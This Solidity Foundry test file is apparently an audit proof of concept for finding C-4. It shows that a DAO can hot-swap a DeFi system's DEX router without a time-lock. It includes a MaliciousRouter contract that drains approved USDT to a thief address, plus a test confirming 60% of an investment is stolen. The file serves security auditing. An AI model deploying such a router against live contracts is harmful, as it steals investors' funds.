// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../BaseFork.t.sol";

/// @dev Malicious router that swallows whatever USDT the system approves and
///      reports back any quote/swap values the system asks for.
contract MaliciousRouter {
    address public theif;
    address public usdt;

    constructor(address _thief, address _usdt) {
        theif = _thief;
        usdt = _usdt;
    }

    function factory() external view returns (address) { return address(this); }

    function getPair(address, address) external view returns (address) { return address(this); }

    function swapExactTokensForTokens(
        uint amountIn,
        uint,
        address[] calldata path,
        address,
        uint
    ) external returns (uint[] memory amounts) {
        // Pull the USDT the system has approved us for and forward to the thief.
        IERC20(path[0]).transferFrom(msg.sender, theif, amountIn);
        amounts = new uint[](path.length);
        amounts[0] = amountIn;
        amounts[1] = 0;
    }

    function quote(uint, uint, uint) external pure returns (uint) { return 0; }

    function addLiquidity(
        address, address, uint, uint, uint, uint, address, uint
    ) external pure returns (uint, uint, uint) {
        return (0, 0, 0);
    }

    function getReserves() external pure returns (uint112, uint112, uint32) {
        return (1, 1, 0);
    }

    function token0() external view returns (address) { return usdt; }
}

/// @title RouterHotSwapTest -- PoC for AUDIT finding C-4
/// @notice The DAO can swap `dexRouter` at any time with no time-lock. A
///         compromised DAO redirects the 60% USDT swap portion of every
///         subsequent invest to an attacker-controlled router.
contract RouterHotSwapTest is BaseForkSetup {

    function test_C4_dao_can_hot_swap_router_and_steal_invest_swap_portion() public {
        // Use the fresh system so we have a clean MLM and can drive invest().
        _deployFreshSystem();

        address victim = makeAddr("victim");
        uint256 amt = 1_000 * WAD;

        // Baseline behavior: a normal invest sends 60% to the real router for
        // swap. We just record the system's USDT inflow.
        uint256 sysUsdtBefore = IERC20(USDT).balanceOf(address(freshSystem));
        _investFresh(victim, amt, freshOrigin);
        uint256 sysUsdtAfterReal = IERC20(USDT).balanceOf(address(freshSystem));
        emit log_named_string("System USDT held after REAL-router invest",
            _toUsdt(sysUsdtAfterReal - sysUsdtBefore));

        // Now DAO hot-swaps the router to a malicious contract.
        MaliciousRouter mal = new MaliciousRouter(attacker, USDT);
        vm.prank(freshDao);
        freshSystem.setDexRouter(address(mal));
        emit log_named_address("dexRouter swapped to malicious", address(mal));

        // Second invest sends the swap portion (60% of usdtAmount) to the
        // attacker's chosen address via the malicious router.
        address victim2 = makeAddr("victim2");
        uint256 attackerBefore = IERC20(USDT).balanceOf(attacker);

        // The fresh setup added max-uint approval to the OLD router. The
        // setDexRouter setter zeroes the old approval and re-approves the
        // new (malicious) router for max -- so the malicious router can
        // pull `swapAmount` USDT in one call. Drive a real invest now.
        _investFresh(victim2, amt, freshOrigin);
        uint256 attackerAfter = IERC20(USDT).balanceOf(attacker);

        uint256 stolen = attackerAfter - attackerBefore;
        emit log_named_string("USDT stolen by malicious router (swap portion)", _toUsdt(stolen));
        // Swap portion is 60% per `_swapTokenFromPancakev2`.
        assertEq(stolen, (amt * 60) / 100,
            "PoC: malicious router pulled exactly 60% of the invest = the swap portion");
    }

    function test_C4_no_timelock_on_setDexRouter() public {
        // Confirm there is no time-lock around setDexRouter -- the DAO
        // controller can flip the router synchronously. Static checking:
        // we read the live `dexRouter` value and assert there is no
        // associated pending-router state on chain.
        (bool ok, ) = SYSTEM.staticcall(abi.encodeWithSignature("pendingDexRouter()"));
        emit log_named_string("Does system expose pendingDexRouter()?", ok ? "YES" : "NO");
        assertEq(ok, false, "PoC: no two-phase / time-locked router migration exists");
    }
}
